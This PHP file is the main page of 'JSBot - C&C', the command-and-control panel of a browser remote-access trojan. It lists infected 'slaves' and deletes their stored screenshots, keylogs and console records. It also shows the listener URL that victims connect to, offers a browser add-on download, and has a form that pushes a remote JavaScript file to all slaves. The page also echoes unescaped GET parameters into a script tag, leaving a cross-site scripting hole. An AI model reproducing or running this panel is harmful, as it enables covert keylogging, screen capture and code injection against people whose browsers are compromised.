<?php
if(!file_exists('sys/head.php')) {
  header('location: install.php');
  die();
}
session_start();
if(empty($_SESSION['auth'])) {
  header('Location: login.php');
  die();
}

include 'sys/head.php';

if(!empty($_GET['delete'])) {
  header('location: index.php');
  $uuid = $_GET['delete'];
  $db->table('slaves')->find('uuid', $uuid, 0)->delete();
  $db->table('screenshots')->find('uuid', $uuid, 0)->delete();
  $db->table('keylogs')->find('uuid', $uuid, 0)->delete();
  $db->table('console')->find('uuid', $uuid, 0)->delete();
  die();
}
$p_url = strtolower(explode('/', $_SERVER['SERVER_PROTOCOL'])[0]).'://'.$_SERVER['HTTP_HOST'].(explode('/index.php', $_SERVER['REQUEST_URI']))[0];
?>
<!DOCTYPE html>
<html>
  <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>JSBot - C&C</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="all,follow">
    <link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="vendor/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/font.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Muli:300,400,700">
    <link rel="stylesheet" href="css/style.default.css" id="theme-stylesheet">
    <link rel="stylesheet" href="css/custom.css?cb=<?=rand(1,99999);?>">
    <link rel="shortcut icon" href="img/favicon.ico">
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
  <body>
    <header class="header">
      <nav class="navbar navbar-expand-lg">
        <div class="container-fluid d-flex align-items-center justify-content-between">
          <div class="navbar-header">
            <a href="index.php" class="navbar-brand">
              <div class="brand-text brand-big visible text-uppercase"><strong class="text-primary">JSBot</strong><strong>C&C</strong></div>
              <div class="brand-text brand-sm"><strong class="text-primary">JS</strong><strong>Rat</strong></div></a>
          </div>
            <div class="list-inline-item logout">
              <a id="logout" href="login.php?killsesh" class="nav-link"> <span class="d-none d-sm-inline">Logout </span><i class="icon-logout"></i></a>
            </div>
          </div>
        </div>
      </nav>
    </header>
    <div class="d-flex align-items-stretch">
      <div class="page-content" style="width:100%;">
        <div class="col-lg-12" style="left:5%;right:5%;width:90%;top:2%;">
          <div class="block">
            <div class="title"><strong> Global Commands </strong> <a href="ajax/cnc.php?clear">(clear command history)</a></div>
            <h2><b><strong>Server Link</strong></b></h2> <input type="text" value="<?=$p_url?>/js/listener.php" style="padding-left: 3px;width:100%; background:lightgrey;" disabled  /><br />
						<a href="extension.php">Download Universal Browser Addon</a>
						<hr />
            <form method="post" action="cmd.php">
              <input type="text" name="arg" placeholder="url to custom JS file to load..." style="width:90%" />
              <input type="hidden" name="cmd" value="customjs" />
              <button style="width:9%">Insert JS</button>
            </form>
          </div>
        </div>
        <div class="col-lg-12 slavesArea" style="left:5%;right:5%;width:90%;top:1%;"></div>
        <div class="col-lg-12" id="slaveViewPort" style="display: none;left:5%;right:5%;width:90%;">
          <div class="block slaveBlock">
            <div class="title"><strong>Slave Managment</strong>	&nbsp;[&nbsp;<i class="slaveHeader" style="color: #DB6574;"></i>&nbsp;] <b id="closeSlaveViewPort">X</b></div>
            <div class="slaveVierPortContent"></div>
          </div>
        </div>
        <footer class="footer">
          <div class="footer__block block no-margin-bottom">
            <div class="container-fluid text-center">
              <p class="no-margin-bottom">2019 &copy; <a href="https://github.com/derp-all-day">Andrew Blalock (GitHub)</a></p>
            </div>
          </div>
        </footer>
      </div>
    </div>
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="js/jquery.form.js"></script>
    <script src="js/ajax.js?cb=<?=rand(1,999);?>"></script>
    <script>
    <?php
    if(key($_GET)=='cooldown') {
      echo 'alert("ERROR: Could not execute command\n\nCooldown still in effect... Please allow for a full 35 second cooldown after each command...");';
    }

    if(!empty($_GET['ret']) && $_GET['ret'] == '1') {
      echo "manageSlave('{$_GET['u']}', '{$_GET['kl']}')";
    }
    ?>
    </script>
  </body>
</html>
